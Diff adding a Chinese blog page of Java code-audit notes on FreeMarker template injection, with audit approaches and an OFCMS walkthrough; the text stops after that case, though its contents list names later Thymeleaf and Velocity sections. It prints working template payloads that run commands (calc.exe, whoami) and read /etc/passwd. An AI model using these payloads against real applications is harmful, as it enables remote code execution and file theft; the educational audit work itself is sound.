@@ -1,0 +1,1272 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="模板安全SSTI漏洞">
+<title>Java代码审计模板安全SSTI漏洞</title>
+
+<link rel='canonical' href='https://lserein.github.io/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/'>
+
+<link rel="stylesheet" href="/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css"><meta property='og:title' content="Java代码审计模板安全SSTI漏洞">
+<meta property='og:description' content="模板安全SSTI漏洞">
+<meta property='og:url' content='https://lserein.github.io/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/'>
+<meta property='og:site_name' content='Lsec&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-08-15T17:02:16&#43;08:00'/><meta property='article:modified_time' content='2025-08-15T17:14:57&#43;08:00'/><meta property='og:image' content='https://lserein.github.io/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/logo.jpg' />
+<meta name="twitter:title" content="Java代码审计模板安全SSTI漏洞">
+<meta name="twitter:description" content="模板安全SSTI漏洞"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://lserein.github.io/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/logo.jpg' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_5a2f261f7f9cea8c.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Lsec&#39;s Blog</a></h1>
+            <h2 class="site-description">欢迎来到Lsec的博客</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Lserein/Lserein.github.io'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://x.com/secL15737016'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E9%93%BE/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友链</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#1freemarker模板注入">1.FreeMarker模板注入</a>
+      <ol>
+        <li><a href="#11freemarker简介">1.1.FreeMarker简介</a></li>
+        <li><a href="#12漏洞审计思路">1.2.漏洞审计思路</a>
+          <ol>
+            <li><a href="#白盒思路">白盒思路</a></li>
+            <li><a href="#黑盒思路">黑盒思路</a></li>
+          </ol>
+        </li>
+        <li><a href="#13漏洞利用方式"><strong>1.3.漏洞利用方式</strong></a></li>
+        <li><a href="#14ofcms-freemarker模板注入漏洞">1.4.OFCMS-freemarker模板注入漏洞</a></li>
+        <li><a href="#15mrcms-freemarker模板注入漏洞">1.5.MRCMS-freemarker模板注入漏洞</a></li>
+      </ol>
+    </li>
+    <li><a href="#2thymeleaf模板注入">2.Thymeleaf模板注入</a>
+      <ol>
+        <li><a href="#21thymeleaf介绍">2.1.Thymeleaf介绍</a></li>
+        <li><a href="#22thymeleaf使用"><strong>2.2.Thymeleaf使用</strong></a></li>
+        <li><a href="#23thymeleaf漏洞利用方式">2.3.Thymeleaf漏洞利用方式</a>
+          <ol>
+            <li><a href="#第一种情况return内容可控"><font style="color:#DF2A3F;">第一种情况，return内容可控</font></a></li>
+            <li><a href="#第二种情况url路径可控"><font style="color:#DF2A3F;">第二种情况，URL路径可控</font></a></li>
+            <li><a href="#第三种情况模板内容可控"><font style="color:#DF2A3F;">第三种情况，模板内容可控</font></a></li>
+          </ol>
+        </li>
+        <li><a href="#24漏洞修复建议">2.4.漏洞修复建议</a>
+          <ol>
+            <li><a href="#1使用responsebody或restcontroller修饰">1.使用@ResponseBody或@RestController修饰</a></li>
+            <li><a href="#2使用redirect或forward修饰">2.使用redirect:或forward:修饰</a></li>
+            <li><a href="#3设置为httpservletresponse">3.设置为HttpServletResponse</a></li>
+          </ol>
+        </li>
+        <li><a href="#25ruoyi460thymeleaf模板注入">2.5.RuoYi4.6.0&mdash;Thymeleaf模板注入</a></li>
+      </ol>
+    </li>
+    <li><a href="#3velocity模板注入">3.Velocity模板注入</a>
+      <ol>
+        <li><a href="#31velocity介绍">3.1.Velocity介绍</a></li>
+        <li><a href="#"><strong><font style="color:#DF2A3F;">3.2.漏洞Demo</font></strong></a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/">
+                <img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/logo_hu_f48c5cb95ca74e4e.jpg"
+                        srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/logo_hu_f48c5cb95ca74e4e.jpg 800w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/logo_hu_143d69195c5e5a67.jpg 1600w"
+                        width="800" 
+                        height="245" 
+                        loading="lazy"
+                        alt="Featured image of post Java代码审计模板安全SSTI漏洞" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="background-color: #2a9d8f; color: #fff;">
+                学习笔记
+            </a>
+        
+            <a href="/categories/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="background-color: #2a9d8f; color: #fff;">
+                Java代码审计
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/">Java代码审计模板安全SSTI漏洞</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            模板安全SSTI漏洞
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Aug 15, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 6 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p><a class="link" href="https://www.cnblogs.com/LittleHann/p/17846825.html"  target="_blank" rel="noopener"
+    >Java模版引擎注入（SSTI）漏洞研究 - 郑瀚 - 博客园</a></p>
+<p><a class="link" href="https://xz.aliyun.com/news/12415"  target="_blank" rel="noopener"
+    >https://xz.aliyun.com/news/12415</a></p>
+<p><a class="link" href="https://mp.weixin.qq.com/s/be0lJ3qQjXC35UYPaUoYNQ"  target="_blank" rel="noopener"
+    >SSTI多种模版注入</a></p>
+<h2 id="1freemarker模板注入">1.FreeMarker模板注入
+</h2><h3 id="11freemarker简介">1.1.FreeMarker简介
+</h3><p><a class="link" href="https://www.cnblogs.com/nice0e3/p/16217471.html"  target="_blank" rel="noopener"
+    >Java安全之freemarker 模板注入 - nice_0e3 - 博客园</a></p>
+<p><a class="link" href="https://mp.weixin.qq.com/s/TtNxfSYsB4HMEpW_OBniew"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/TtNxfSYsB4HMEpW_OBniew</a></p>
+<p><strong>FreeMarker 是一款模板引擎： 即一种基于模板和要改变的数据， 并用来生成输出文本(HTML网页，电子邮件，配置文件，源代码等)的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。</strong></p>
+<p><strong><font style="color:rgb(0, 0, 0);">目前企业中，主要用Freemarker做静态页面或是页面展示</font></strong></p>
+<p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/1.png"
+	width="435"
+	height="180"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/1_hu_658fc2d99c854e99.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/1_hu_829e48e5ac506988.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="241"
+		data-flex-basis="580px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">使用时需要在pom</span><span class="p">.</span><span class="na">xml中引入对应依赖</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="n">dependency</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">&lt;</span><span class="n">groupId</span><span class="o">&gt;</span><span class="n">org</span><span class="p">.</span><span class="na">freemarker</span><span class="o">&lt;/</span><span class="n">groupId</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">&lt;</span><span class="n">artifactId</span><span class="o">&gt;</span><span class="n">freemarker</span><span class="o">&lt;/</span><span class="n">artifactId</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">&lt;</span><span class="n">version</span><span class="o">&gt;</span><span class="n">2</span><span class="p">.</span><span class="na">3</span><span class="p">.</span><span class="na">31</span><span class="o">&lt;/</span><span class="n">version</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;/</span><span class="n">dependency</span><span class="o">&gt;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="12漏洞审计思路">1.2.漏洞审计思路
+</h3><h4 id="白盒思路">白盒思路
+</h4><ol>
+<li><strong>判断是否使用模板技术&mdash;&gt;从pom.xml文件中查找</strong></li>
+<li><strong>判断使用模板框架</strong></li>
+<li><strong>寻找可控点，尝试传入对应poc</strong></li>
+<li><strong>验证利用漏洞</strong></li>
+</ol>
+<h4 id="黑盒思路">黑盒思路
+</h4><p><strong>常出现的功能点：后台模板解析处，模板文件修改处，模板文件上传处&hellip;</strong></p>
+<h3 id="13漏洞利用方式"><strong>1.3.漏洞利用方式</strong>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">#</span><span class="n">assign</span><span class="w"> </span><span class="n">value</span><span class="o">=</span><span class="s">&#34;freemarker.template.utility.ObjectConstructor&#34;</span><span class="o">?</span><span class="w"> </span><span class="k">new</span><span class="p">()</span><span class="o">&gt;</span><span class="n">$</span><span class="p">{</span><span class="n">value</span><span class="p">(</span><span class="s">&#34;java.lang.ProcessBuilder&#34;</span><span class="p">,</span><span class="s">&#34;calc.exe&#34;</span><span class="p">).</span><span class="na">start</span><span class="p">()}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="err">#</span><span class="n">assign</span><span class="w"> </span><span class="n">value</span><span class="o">=</span><span class="s">&#34;freemarker.template.utility.ObjectConstructor&#34;</span><span class="o">?</span><span class="k">new</span><span class="p">()</span><span class="o">&gt;</span><span class="n">$</span><span class="p">{</span><span class="n">value</span><span class="p">(</span><span class="s">&#34;java.lang.ProcessBuilder&#34;</span><span class="p">,</span><span class="s">&#34;whoami&#34;</span><span class="p">).</span><span class="na">start</span><span class="p">()}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="err">#</span><span class="n">assign</span><span class="w"> </span><span class="n">value</span><span class="o">=</span><span class="s">&#34;freemarker.template.utility.JythonRuntime&#34;</span><span class="o">?</span><span class="k">new</span><span class="p">()</span><span class="o">&gt;&lt;</span><span class="nd">@value</span><span class="o">&gt;</span><span class="kn">import</span><span class="w"> </span><span class="nn">os</span><span class="p">;</span><span class="n">os</span><span class="p">.</span><span class="na">system</span><span class="p">(</span><span class="s">&#34;calc.exe&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="err">#</span><span class="n">assign</span><span class="w"> </span><span class="n">ex</span><span class="o">=</span><span class="s">&#34;freemarker.template.utility.Execute&#34;</span><span class="o">?</span><span class="k">new</span><span class="p">()</span><span class="o">&gt;</span><span class="w"> </span><span class="n">$</span><span class="p">{</span><span class="w"> </span><span class="n">ex</span><span class="p">(</span><span class="s">&#34;open -a Calculator.app&#34;</span><span class="p">)</span><span class="w"> </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">#</span><span class="n">assign</span><span class="w"> </span><span class="n">uri</span><span class="o">=</span><span class="n">object</span><span class="o">?</span><span class="n">api</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getResource</span><span class="p">(</span><span class="s">&#34;/&#34;</span><span class="p">).</span><span class="na">toURI</span><span class="p">()</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="err">#</span><span class="n">assign</span><span class="w"> </span><span class="n">input</span><span class="o">=</span><span class="n">uri</span><span class="o">?</span><span class="n">api</span><span class="p">.</span><span class="na">create</span><span class="p">(</span><span class="s">&#34;file:///etc/passwd&#34;</span><span class="p">).</span><span class="na">toURL</span><span class="p">().</span><span class="na">openConnection</span><span class="p">()</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="err">#</span><span class="n">assign</span><span class="w"> </span><span class="n">is</span><span class="o">=</span><span class="n">input</span><span class="o">?</span><span class="n">api</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">()</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">FILE</span><span class="p">:</span><span class="o">[&lt;</span><span class="err">#</span><span class="n">list</span><span class="w"> </span><span class="n">0</span><span class="p">..</span><span class="na">999999999</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">_</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">&lt;</span><span class="err">#</span><span class="n">assign</span><span class="w"> </span><span class="kt">byte</span><span class="o">=</span><span class="n">is</span><span class="p">.</span><span class="na">read</span><span class="p">()</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">&lt;</span><span class="err">#</span><span class="k">if</span><span class="w"> </span><span class="kt">byte</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">-</span><span class="n">1</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="o">&lt;</span><span class="err">#</span><span class="k">break</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">&lt;/</span><span class="err">#</span><span class="k">if</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">$</span><span class="p">{</span><span class="kt">byte</span><span class="p">},</span><span class="w"> </span><span class="o">&lt;/</span><span class="err">#</span><span class="n">list</span><span class="o">&gt;]</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="14ofcms-freemarker模板注入漏洞">1.4.OFCMS-freemarker模板注入漏洞
+</h3><p><a class="link" href="https://mp.weixin.qq.com/s/YXOyBee3ByAGRlxDpnip8Q"  target="_blank" rel="noopener"
+    >java代码审计&ndash;OFCMS</a></p>
+<p><strong>查看项目配置文件pom.xml</strong></p>
+<p><strong>可以看到引入了Freemarker依赖</strong></p>
+<p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/2.png"
+	width="1696"
+	height="504"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/2_hu_5850e8ae826f3190.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/2_hu_66a6be533e0f1f45.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="336"
+		data-flex-basis="807px"
+	
+></p>
+<p><strong>登录管理员后台，发现存在模板管理功能点</strong></p>
+<p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/3.png"
+	width="1710"
+	height="1059"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/3_hu_ce475c258624a90c.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/image/3_hu_98221e45595fa2b3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="161"
+		data-flex-basis="387px"
+	
+></p>
+<p><strong>在about.html文件中插入poc</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">#</span><span class="n">assign</span><span class="w"> </span><span class="n">value</span><span class="o">=</span><span class="s">&#34;freemarker.template.utility.ObjectConstructor&#34;</span><span class="o">?</span><span class="w"> </span><span class="k">new</span><span class="p">()</span><span class="o">&gt;</span><span class="n">$</span><span class="p">{</span><span class="n">value</span><span class="p">(</span><span class="s">&#34;java.lang.ProcessBuilder&#34;</span><span class="p">,</span><span class="s">&#34;calc.exe&#34;</span><span class="p">).</span><span class="na">start</span><span class="p">()}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>访问about.html页面成功弹出计算器</p>
